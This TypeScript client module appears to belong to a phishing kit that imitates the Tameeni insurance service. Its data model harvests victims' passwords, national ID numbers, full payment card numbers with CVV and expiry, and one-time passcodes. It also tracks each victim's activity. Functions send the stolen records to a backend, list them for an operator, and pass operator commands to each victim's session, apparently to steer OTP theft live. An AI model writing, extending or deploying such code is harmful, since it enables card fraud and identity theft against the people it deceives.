const BASE = "/api/tameeni";

export interface Submission {
  id: string; submittedAt: string; submittedAtTs: number;
  name: string; phone: string; nationalId: string;
  email: string; password: string;
  carPlate: string; carYear: string; carMake: string;
  cardNumber: string; cardName: string; cardMonth: string; cardYearExp: string; cardCvv: string;
  otpCode: string; otpStatus: string | null;
  page: string; isActive: boolean; lastSeen: number; country: string;
}

export const tameeniApi = {
  async submit(data: Omit<Submission, 'isActive'>) {
    await fetch(`${BASE}/submit`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });
  },
  async patch(id: string, data: Partial<Submission>) {
    await fetch(`${BASE}/submissions/${id}`, { method: "PATCH", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });
  },
  async getAll(): Promise<Submission[]> {
    const r = await fetch(`${BASE}/submissions`);
    return r.json();
  },
  async sendCmd(id: string, cmd: string) {
    await fetch(`${BASE}/cmd/${id}`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ cmd }) });
  },
  async getCmd(id: string): Promise<string | null> {
    const r = await fetch(`${BASE}/cmd/${id}`);
    const d = await r.json();
    return d.cmd;
  },
  async deleteOne(id: string) {
    await fetch(`${BASE}/submissions/${id}`, { method: "DELETE" });
  },
  async deleteAll() {
    await fetch(`${BASE}/submissions`, { method: "DELETE" });
  },
};
